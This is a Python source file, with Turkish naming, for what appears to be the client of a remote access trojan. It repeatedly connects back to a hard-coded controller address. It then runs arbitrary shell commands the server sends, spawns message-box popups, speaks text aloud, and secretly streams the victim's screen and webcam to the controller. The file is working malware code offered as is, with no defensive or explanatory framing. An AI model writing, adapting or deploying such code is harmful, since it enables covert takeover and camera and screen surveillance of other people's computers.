import socket
import sys
import os
import shutil
import time
import pymsgbox
import threading
import pyttsx3
import vidstream
from dataclasses import dataclass

IP = "192.168.1.153"
PORT = 1234
BUFFER_SIZE = 2048

def setup_and_while_connect(ip: str, port: int) -> socket.socket:
    while True:
        try:
            ADRESS = (ip, port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect(ADRESS)
            return sock
        except (ConnectionError):
            time.sleep(5)

class YapilacakGorevler:
    @dataclass
    class vidObjects:
        screen: vidstream.ScreenShareClient = None
        camera: vidstream.CameraClient = None

    @staticmethod
    def messagebox(baslik: str, metin: str, icon: int = 0, repeat: int = 0) -> None:
        def run():
            if repeat == 0:
                pymsgbox.alert(metin, baslik, icon=icon)
            else:
                for i in range(1, repeat + 1):
                    threading.Thread(
                        target=lambda: pymsgbox.alert(metin, baslik, icon=icon),
                        daemon=True
                    ).start()
        threading.Thread(
            target=run,
            daemon=True
        ).start()

    @staticmethod
    def speec_computer(metin: str | None = "Hello World") -> None:
        def run():
            engine = pyttsx3.init()
            engine.say(metin)
            engine.runAndWait()
        threading.Thread(
            target=run,
            daemon=True
        ).start()

if __name__ == '__main__':
    sock = setup_and_while_connect(IP, PORT)
    while True:
        try:
            data = sock.recv(BUFFER_SIZE)
            if not data:
                raise ConnectionError("Connection closed.")
            data = data.decode("utf-8")

            match data:
                case "messagebox":
                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    baslik = data

                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    metin = data

                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    ikon = data

                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    repeat = data
                    YapilacakGorevler.messagebox(baslik, metin, int(ikon), int(repeat))

                case "komut_satiri":
                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    komut = data
                    os.system(komut)

                case "konustur":
                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    metin = data
                    YapilacakGorevler.speec_computer(metin)

                case "baslat":
                    data = sock.recv(BUFFER_SIZE)
                    data = data.decode("utf-8")
                    port = int(data)
                    YapilacakGorevler.vidObjects.screen = vidstream.ScreenShareClient(host=IP, port=port)
                    YapilacakGorevler.vidObjects.camera = vidstream.CameraClient(host=IP, port=port + 1)
                    YapilacakGorevler.vidObjects.screen.start_stream()
                    YapilacakGorevler.vidObjects.camera.start_stream()

                case "durdur":
                    YapilacakGorevler.vidObjects.screen.stop_stream()
                    YapilacakGorevler.vidObjects.camera.stop_stream()
                    if YapilacakGorevler.vidObjects.screen:
                        YapilacakGorevler.vidObjects.screen = None
                    if YapilacakGorevler.vidObjects.camera:
                        YapilacakGorevler.vidObjects.camera = None
                    
        except (ConnectionError):
            if YapilacakGorevler.vidObjects.screen:
                YapilacakGorevler.vidObjects.screen = None
            sock.close()
            sock = setup_and_while_connect(IP, PORT)